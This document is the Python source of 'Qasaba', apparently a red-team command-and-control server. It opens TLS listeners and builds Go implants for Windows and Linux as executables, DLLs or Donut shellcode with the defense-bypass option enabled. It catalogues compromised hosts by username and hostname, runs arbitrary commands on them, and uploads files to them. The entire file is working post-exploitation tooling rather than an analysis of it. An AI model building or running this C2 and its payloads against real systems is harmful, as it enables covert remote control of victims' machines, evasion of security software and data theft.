import socket
import random
import string
import threading
import os
import base64
import donut
import shutil
import subprocess
import time
import ssl
from datetime import datetime
from prettytable import PrettyTable
from colorama import Fore, Style

# func: banner
def banner():
    print()
    print("██████╗  █████╗ ███████╗ █████╗ ██████╗  █████╗") 
    print("██╔═══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗") 
    print("██║   ██║███████║███████╗███████║██████╔╝███████║") 
    print("██║▄▄ ██║██╔══██║╚════██║██╔══██║██╔══██╗██╔══██║") 
    print("╚██████╔╝██║  ██║███████║██║  ██║██████╔╝██║  ██║") 
    print(" ╚══▀▀═╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝") 
    print("+ Golang/Python3 minimalistic C2 over rawTLS +")
    print()

# func: help menu
def help():
    print("""
    Menu commands:
    ---------------------------------------
    :listener -g <IP port>   --  create a new listener
    :payloads -c <pld>       --  create a Go agent (win/x64/exe, win/x32/exe, nix/x64/elf, win/x64/dll, win/x64/shellcode)
    :sessions -l             --  list sessions 
    :sessions -i <id>        --  interact with a session
    :sessions -k <id>        --  kill a session
    
    Sessions commands:
    ---------------------------------------
    :back                   --  background the current session
    :exit                   --  close the current session
    :upload <local> <remote>--  upload a local file to the remote agent
    """)

# func: geting env variables
def init():
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Initializing Qasaba")
    try:
    # checking avalaible binaries
        go = subprocess.getoutput(["which go"])
        if len(go) == 0:
            print(">>> Go is not installed")
        else:
            go_version = subprocess.getoutput(["go version"])
            print (">>> Go available: " + go_version)
            gocache = subprocess.getoutput(["go env GOCACHE"])
            if len(gocache) == 0:
                print(">>> Gocache environment variable is not set")
            else:
                print (">>> Gocache environment: " + gocache)
                rst = gocache.split("/")[1:-2]
                gohome =''
                i = 0
                while i < len(rst):
                    gohome += '/' + str(rst[i-1])
                    i += 1
                print (">>> Go home environment: " + gohome)
        mingw = subprocess.getoutput(["which x86_64-w64-mingw32-gcc"])
        if len(mingw) == 0:
            print(">>> x86_64-w64-mingw32-gcc is not installed")
        else:
            print (">>> x86_64-w64-mingw32-gcc available")
        if len(go) == 0 or len(gocache) == 0 or len(mingw) == 0:
            print(Fore.BLUE + "[+]" + Fore.WHITE +" Failed to initialized the server")
            exit(0)
        # tls init
        tls = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        tls.load_cert_chain(certfile="utils/key/cert.pem", keyfile="utils/key/cert.key")
        # socket init
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print()
        print(Fore.BLUE + "[+]" + Fore.WHITE +" Qasaba is ready")
        print(Fore.YELLOW + "[*]" + Fore.WHITE +" Please start a listener before running a payload")
    except Exception as e:
        print(Fore.RED + "[!]" + Fore.WHITE + " Failed to initialize: " + str(e))
        exit(0)
    return s, tls, gocache, gohome

# func: getting current time
def cur_time():
    cur_time = time.strftime("%H:%M:%S", time.localtime())
    date = datetime.now()
    return str(date.month) + "/" + str(date.day) + "/" + str(date.year) + " " + str(cur_time)

# func: copying the content of a file into a buffer
def copy_from_file(file):
    try:
        with open(file, "rb") as f:
            buf = f.read()
            # encode binary into b64
            enc = base64.b64encode(buf)
            return enc
    except Exception as e:
        print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred when reading a file: " + str(e))

# func: creating a DLL agent in Go
def dll_gen(rip, rport, arch, sys, gocache, gohome):
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Creating a DLL agent for "+ sys + "/" + arch)
    rand_name = "".join(random.choice(string.ascii_letters) for i in range(8))
    cwd = os.getcwd()
    templ_path = cwd + "/agents/template/dll.go"
    in_path = cwd + "/agents/" + rand_name + ".go"
    if os.path.exists(templ_path):
        shutil.copy(templ_path, in_path)
    else:
        print(Fore.RED + "[!]" + Fore.WHITE + " dll.go file not found")
    try:
        with open(in_path) as f:
            host = f.read().replace("<HOST>",rip)
            with open(in_path, "w") as f:
                f.write(host)
                f.close()
        with open(in_path) as f:
            port = f.read().replace("<PORT>",rport)
            with open(in_path, "w") as f:
                f.write(port)
                f.close()
        out_path = cwd + "/agents/" + rand_name + ".dll"
        subprocess.run(["go","build","-o",out_path,"-buildmode=c-shared",in_path], check=True, env={'GOOS':sys, 'GOARCH':arch, 'CGO_ENABLED':'1', 'CC':'/usr/bin/x86_64-w64-mingw32-gcc', 'GOCACHE':gocache, 'HOME':gohome})
        print(Fore.BLUE + "[+]" + Fore.WHITE +" The agent is available at " + out_path)
    except Exception as e:
        print(Fore.RED + "[!]" + Fore.WHITE + " Something failed during payload generation: " + str(e))


# func: creating an agent in Go
def agent_gen(rip, rport, arch, sys, gocache, gohome):
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Creating a go agent for "+ sys + "/" + arch)
    rand_name = "".join(random.choice(string.ascii_letters) for i in range(8))
    cwd = os.getcwd()
    templ_path = cwd + "/agents/template/agent.go"
    in_path = cwd + "/agents/" + rand_name + ".go"
    if os.path.exists(templ_path):
        shutil.copy(templ_path, in_path)
    else:
        print(Fore.RED + "[!]" + Fore.WHITE + " agent.go file not found")
    try:
        with open(in_path) as f:
            host = f.read().replace("<HOST>",rip)
            with open(in_path, "w") as f:
                f.write(host)
                f.close()
        with open(in_path) as f:
            port = f.read().replace("<PORT>",rport)
            with open(in_path, "w") as f:
                f.write(port)
                f.close()
        if sys == "windows":
            out_path = cwd + "/agents/" + rand_name + ".exe"
        else:
            out_path = cwd + "/agents/" + rand_name
        subprocess.run(["go","build","-o",out_path,in_path], check=True, env={'GOOS':sys, 'GOARCH':arch,'GOCACHE':gocache, 'HOME':gohome})
        print(Fore.BLUE + "[+]" + Fore.WHITE +" The agent is available at " + out_path)
    except Exception as e:
        print(Fore.RED + "[!]" + Fore.WHITE + " Something failed during payload generation: " + str(e))

# func: creating a shellcode from Go agent using Donut
def shellcode_gen(rip, rport, arch, sys, gocache, gohome):
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Creating a go agent for "+ sys + "/" + arch)
    rand_name = "".join(random.choice(string.ascii_letters) for i in range(8))
    cwd = os.getcwd()
    templ_path = cwd + "/agents/template/agent.go"
    in_path = cwd + "/agents/" + rand_name + ".go"
    if os.path.exists(templ_path):
        shutil.copy(templ_path, in_path)
    else:
        print(Fore.RED + "[!]" + Fore.WHITE + " agent.go file not found")
    try:
        with open(in_path) as f:
            host = f.read().replace("<HOST>",rip)
            with open(in_path, "w") as f:
                f.write(host)
                f.close()
        with open(in_path) as f:
            port = f.read().replace("<PORT>",rport)
            with open(in_path, "w") as f:
                f.write(port)
                f.close()
        if sys == "windows":
            out_path = cwd + "/agents/" + rand_name + ".exe"
        else:
            out_path = cwd + "/agents/" + rand_name
        subprocess.run(["go","build","-o",out_path,in_path], check=True, env={'GOOS':sys, 'GOARCH':arch,'GOCACHE':gocache, 'HOME':gohome})
        print(Fore.BLUE + "[+]" + Fore.WHITE +" Generating a shellcode from" + rand_name + " agent" )
        shellcode = donut.create(file=out_path, arch=2,bypass=1)
        out_path = cwd + "/agents/" + rand_name + ".bin"
        with open(out_path, "wb") as f:
                f.write(shellcode)
                f.close()
        print(Fore.BLUE + "[+]" + Fore.WHITE +" The agent is available at " + out_path)
    except Exception as e:
        print(Fore.RED + "[!]" + Fore.WHITE + " Something failed during shellcode generation: " + str(e))

# func: tasking agent to get hostname
def gethost(remote_target):
    try:
        m = ":host" #
        com_out(remote_target, m)
        host = com_in(remote_target)
    except:
        host = "--"
    return host.strip()


# func: tasking agent to get username
def getuser(remote_target):
    try:
        m = ":user" # getting username
        com_out(remote_target, m)
        host = com_in(remote_target)
    except:
        host = "--"
    return host.strip()


# func: receiving communication from client
def com_in(targ_id):
    # print(Fore.YELLOW + "[*]" + Fore.WHITE + " Incoming response")
    data = ""
    l_count = 0
    expected_len = int(base64.b64decode(targ_id.recv(1024)).decode())
    while True:
        r = base64.b64decode(targ_id.recv(1024))
        data += r.decode()
        l_count += 1024
        if l_count >= expected_len:
            break
    return data


# func: sending communication to client
def com_out(targ_id, m):
    #print(Fore.BLUE + "[+]" + Fore.WHITE +" Sending len")
    out = base64.b64encode(m.encode())
    len_init = len(out)
    str_len_init = str(len_init)
    len_out = base64.b64encode(str_len_init.encode())
    targ_id.send(len_out)
    #print(Fore.BLUE + "[+]" + Fore.WHITE +" Sending message")
    out_chunked = [out[i:i+1024] for i in range(0, len_init, 1024)]
    for chunk in out_chunked:
        targ_id.send(chunk)

# func: handling TCP communication between listener and a client
def targ_comm(targ_id):
    while True:
        try:
            m = input("c2 >" + Fore.RED + " " + (targets[num])[2] + "@" + ((targets[num])[1])[0] + " > " + Fore.WHITE)

            if m == ':exit':
                print(Fore.BLUE + "[+]" + Fore.WHITE +" Elegantly closing the connection now")
                com_out(targ_id, m)
                (targets[num])[6] = "Dead"
                break

            elif m == ':back':
                break

            # TODO: func last seen into com_in
            elif m.split(" ")[0] == ':upload':
                lfile = m.split(" ")[1]
                rfile = m.split(" ")[2]
                if os.path.exists(lfile):
                    if len(rfile) > 0:
                        print(Fore.BLUE + "[+]" + Fore.WHITE +" Reading file from " + lfile)
                        buf = copy_from_file(lfile)
                        out = m.split(" ")[0] + " " + rfile
                        com_out(targ_id, out)
                        print(Fore.BLUE + "[+]" + Fore.WHITE +" Sending " + str(len(buf)) + " bytes")
                        targ_id.sendall(buf)
                        # Sending a signal to the agent to stop the transfer
                        targ_id.send(":EOF:".encode())
                        print(Fore.BLUE + "[+]" + Fore.WHITE +" payload sent")
                        print(Fore.BLUE + "[+]" + Fore.WHITE +" Awaiting response")
                        print(com_in(targ_id))
                        last_seen = cur_time()
                        (targets[num])[4] = last_seen
                    else:
                        print(Fore.RED + "[!]" + Fore.WHITE + " You must specify a remote directory")
                else:
                    print(Fore.RED + "[!]" + Fore.WHITE + " " + m.split(" ")[0] + " doesn't exist" )

            else:
                com_out(targ_id, m)
                print(com_in(targ_id))
                last_seen = cur_time()
                (targets[num])[4] = last_seen
        except SyntaxError:
            targ_id.close()
            print(Fore.RED + "[!]" + Fore.WHITE + " Wrong input. Connection closed")
            break
        except KeyboardInterrupt:
            quit_message_agent = input("\n[*] Confirm you really want to quit (y/n)\n")
            if quit_message_agent == "y":
                com_out(targ_id, ":exit")
                (targets[num])[6] = "Dead"
                print(Fore.RED + "[!]" + Fore.WHITE + " User interruption. Connection closed")
                break
        except Exception as e:
            targ_id.close()
            print(Fore.RED + "[!]" + Fore.WHITE + " Something failed. Connection closed: " + str(e))
            break


# func: handling new clients
def comm_handler():
    while True:
        try:
            remote_target, remote_ip = s.accept()
            tls_remote_target = tls.wrap_socket(remote_target, server_side=True)
            first_seen = cur_time()
            last_seen = first_seen
            hostname = gethost(tls_remote_target)
            username = getuser(tls_remote_target)
            print(Fore.GREEN + "\n[*]" + Fore.WHITE + " Connection received from " + username + "@" + str(remote_ip[0]) + " (" + hostname + ")\nc2 >", end="")
            targets.append([tls_remote_target, remote_ip, hostname, first_seen, last_seen, username, "Active"])
        except Exception as e:
            print(Fore.RED + "[!]" + Fore.WHITE + " Something failed to handle incoming client: " + str(e))


# func: binding port and starting a thread
def listener_handler():
    if listener_set == 0:
        try:
            s.bind((host_ip, host_port))
            print(Fore.BLUE + "[+]" + Fore.WHITE +" Awaiting connection on " + str(host_port))

            s.listen()

            t1 = threading.Thread(target=comm_handler)
            t1.daemon = True  # cause the thread to terminate when process ends
            t1.start()
        except Exception as e:
            print(Fore.RED + "[!]" + Fore.WHITE + " Failed to open port on " + str(host_port) + ", error: " + str(e))
    else:
        print(Fore.RED + "[!]" + Fore.WHITE + " Listener must be configured before being run")

if __name__ == '__main__':
    targets = []
    listener_set = 0
    banner()
    s, tls, gocache, gohome = init()
    print(Fore.YELLOW+ "[*]" + Fore.WHITE +" Use :help to get assistance")

    while True:
        try:
            inp = input("c2 > ")

            if inp == ':help':
                help()

            if inp.split(" ")[0] == ":listener":
                if inp.split(" ")[1] == "-g":
                    host_ip = inp.split(" ")[2]
                    host_port = int(inp.split(" ")[3])
                    listener_handler()
                    listener_set = 1

            if inp.split(" ")[0] == ":payloads":
                if listener_set == 0:
                    print(Fore.RED + "[!]" + Fore.WHITE + " A listener must be started before generating a payload ")
                else:
                    if inp.split(" ")[1] == "-c":
                        if inp.split(" ")[2] == "win/x64/exe":
                            agent_gen(host_ip, str(host_port), 'amd64', 'windows', gocache, gohome)
                        if inp.split(" ")[2] == "win/x32/exe":
                            agent_gen(host_ip, str(host_port), '386', 'windows', gocache, gohome)
                        if inp.split(" ")[2] == "nix/x64/elf":
                            agent_gen(host_ip, str(host_port), 'amd64', 'linux', gocache, gohome)
                        if inp.split(" ")[2] == "win/x64/dll":
                            dll_gen(host_ip, str(host_port), 'amd64', 'windows', gocache, gohome)
                        if inp.split(" ")[2] == "win/x64/shellcode":
                            shellcode_gen(host_ip, str(host_port), 'amd64', 'windows', gocache, gohome)

            if inp.split(" ")[0] == ":sessions":
                sessions_counter = 1
                if inp.split(" ")[1] == "-l":
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Target', 'Hostname', 'First Seen', 'Last Seen']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([sessions_counter, target[6], target[5], (target[1])[0], target[2], target[3], target[4]])
                        sessions_counter += 1
                    print(myTable)

                if inp.split(" ")[1] == "-k":
                    num = int(inp.split(" ")[2]) - 1
                    try:
                        if (targets[num])[6] == "Active":
                            com_out((targets[num])[0], ':exit')
                            print(Fore.BLUE + "[+]" + Fore.WHITE +" Terminating session from " + ((targets[num])[1])[0] + "(" + (targets[num])[2] + ")")
                            (targets[num])[6] = "Dead"
                        else:
                            print(Fore.RED + "[!]" + Fore.WHITE + " Session must be active")
                    except IndexError:
                        print(Fore.RED + "[!]" + Fore.WHITE + " This session doesn't exist")

                if inp.split(" ")[1] == "-i":
                    num = int(inp.split(" ")[2]) - 1
                    try:
                        if (targets[num])[6] == "Active":
                            targ_id = (targets[num])[0]
                            targ_comm(targ_id)
                        else:
                            print(Fore.RED + "[!]" + Fore.WHITE + " Session must be active")
                    except IndexError:
                        print(Fore.RED + "[!]" + Fore.WHITE + " This session doesn't exist")
                
        except KeyboardInterrupt:
            quit_message  = input("\n[*] Confirm you really want to quit (y/n)\n")
            if quit_message == "y":
                for target in targets:
                    if target[6] == "Dead":
                        pass
                    else:
                        com_out(target[0], ':exit')
                        print(Fore.BLUE + "[+]" + Fore.WHITE +" Terminating session from " + (target[1])[0] +"(" + target[2]+")")
                print(Fore.BLUE + "[+]" + Fore.WHITE +" Exiting now!")
                break
        except Exception as e:
            print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred: " + str(e))
